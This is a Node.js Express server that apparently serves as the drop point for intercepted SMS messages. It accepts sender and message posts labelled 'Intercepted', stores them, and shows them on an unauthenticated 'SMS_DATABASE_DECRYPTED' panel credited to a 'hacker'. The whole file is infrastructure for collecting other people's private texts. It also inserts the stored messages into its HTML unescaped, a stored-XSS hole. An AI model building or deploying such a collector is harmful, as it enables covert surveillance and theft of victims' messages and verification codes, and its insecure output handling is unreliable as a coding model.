const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'sms_logs.json');

app.use(bodyParser.urlencoded({ extended: true }));

// Helper function to read/write JSON
const getLogs = () => {
    if (!fs.existsSync(DATA_FILE)) return [];
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (e) { return []; }
};

const saveLogs = (logs) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify(logs, null, 2));
};

// 1. Home Route
app.get('/', (req, res) => {
    res.send('<body style="background:#000;color:#0f0;font-family:monospace;padding:50px;"><h1>[ SYSTEM READY ]</h1><p>Endpoint: /view-sms</p></body>');
});

// 2. Receive SMS (Saves to JSON)
app.post('/receive', (req, res) => {
    const { sender, message } = req.body;
    if (sender && message) {
        const logs = getLogs();
        const newEntry = {
            id: Date.now(),
            timestamp: new Date().toLocaleString(),
            sender: sender,
            message: message.replace(/\n/g, " ") // Multi-line fix
        };
        
        logs.push(newEntry);
        saveLogs(logs);
        
        console.log(`[+] Intercepted: ${sender}`);
        res.status(200).send("DATA_STASHED");
    } else {
        res.status(400).send("BAD_PAYLOAD");
    }
});

// 3. View SMS (JSON to Hacker Table)
app.get('/view-sms', (req, res) => {
    const logs = getLogs().reverse(); // Newest first
    
    let rows = logs.map(log => `
        <tr style="border-bottom: 1px solid #030;">
            <td style="padding:15px; color:#555;">${log.timestamp}</td>
            <td style="padding:15px; color:#0f0; font-weight:bold;">${log.sender}</td>
            <td style="padding:15px; color:#0d0;">${log.message}</td>
        </tr>
    `).join('');

    res.send(`
    <body style="background:#050505; color:#0f0; font-family:'Courier New', monospace; padding:20px;">
        <div style="border:1px solid #0f0; padding:20px; box-shadow: 0 0 20px #050;">
            <h1 style="text-shadow: 0 0 10px #0f0;">> SMS_DATABASE_DECRYPTED</h1>
            <p style="color:#0a0;">DEVLOPER: HACKER ALEX | STATUS: ACTIVE</p>
            <hr style="border:0.5px solid #050;">
            <table style="width:100%; border-collapse:collapse; margin-top:20px;">
                <tr style="background:#0f0; color:#000; text-transform:uppercase;">
                    <th style="padding:12px; text-align:left;">Time</th>
                    <th style="padding:12px; text-align:left;">Sender</th>
                    <th style="padding:12px; text-align:left;">Message</th>
                </tr>
                ${rows || '<tr><td colspan="3" style="text-align:center; padding:50px; color:#030;">NO DATA IN DATABASE.</td></tr>'}
            </table>
            <br>
            <button onclick="location.reload()" style="background:#0f0; color:#000; border:none; padding:10px 25px; font-weight:bold; cursor:pointer;">[ REFRESH ]</button>
            <form action="/clear-logs" method="GET" style="display:inline;">
                <button type="submit" style="background:#f00; color:#fff; border:none; padding:10px 25px; font-weight:bold; cursor:pointer; margin-left:10px;">[ WIPE_DATABASE ]</button>
            </form>
        </div>
    </body>
    `);
});

// 4. Clear Logs Route (Wipe DB)
app.get('/clear-logs', (req, res) => {
    saveLogs([]);
    res.redirect('/view-sms');
});

app.listen(PORT, () => console.log(`SYSTEM_UP_ON_${PORT}`));